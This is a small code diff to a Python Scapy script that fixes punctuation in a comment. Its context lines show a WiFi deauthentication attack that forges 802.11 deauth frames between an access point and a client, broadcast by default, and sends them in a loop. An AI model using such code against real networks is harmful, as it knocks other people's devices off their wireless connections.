@@ -26,7 +26,7 @@ def start(interface, ap, device="ff:ff:ff:ff:ff:ff"):
     pkt_to_ap = RadioTap() / Dot11(addr1=ap, addr2=device, addr3=ap) / Dot11Deauth()
 
     while flag:
-        # The sendp() function send packets at layer 2 - Data Link Layer
+        # The sendp() function send packets at layer 2 - Data Link Layer.
         # Sending deauthentication packet from AP to device.
         sendp(pkt_to_c, iface=interface, verbose=0)
         # Sending deauthentication packet from device to AP.
